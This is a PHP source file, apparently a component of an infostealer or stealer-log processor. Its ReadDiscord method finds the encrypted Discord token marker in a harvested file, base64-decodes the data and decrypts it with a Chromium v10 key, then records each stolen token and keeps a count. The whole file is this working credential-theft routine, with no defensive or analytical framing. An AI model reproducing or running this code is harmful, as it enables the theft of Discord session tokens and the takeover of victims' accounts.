<?php

class ProgramsManager
{
    // ---------------------------------------------------------------------------------------
    // ReadDiscord
    //
    // read and decrypt discord tokens
    // ---------------------------------------------------------------------------------------
    public static function ReadDiscord($log, $file)
    {
        $begin = strpos($file, "dQw4w9WgXcQ");
    
        if ($begin !== false) 
        {
            $begin += 12;
            
            $_encrypted_token = base64_decode(substr($file, $begin, 140));
            $decrypted = "";

            BrowsersManager::Chromium_DecryptV10($_encrypted_token, $log->decrypt_keys["Discord"]["v10"], $decrypted);

            if(strlen($decrypted) > 1)
            {
                $log->log_info["soft"]["Discord"]["count"]++;
                $log->log_info["soft"]["Discord"]["tokens"][] = $decrypted;
                
                return $decrypted."\n";
            }
        }
    }
}

?>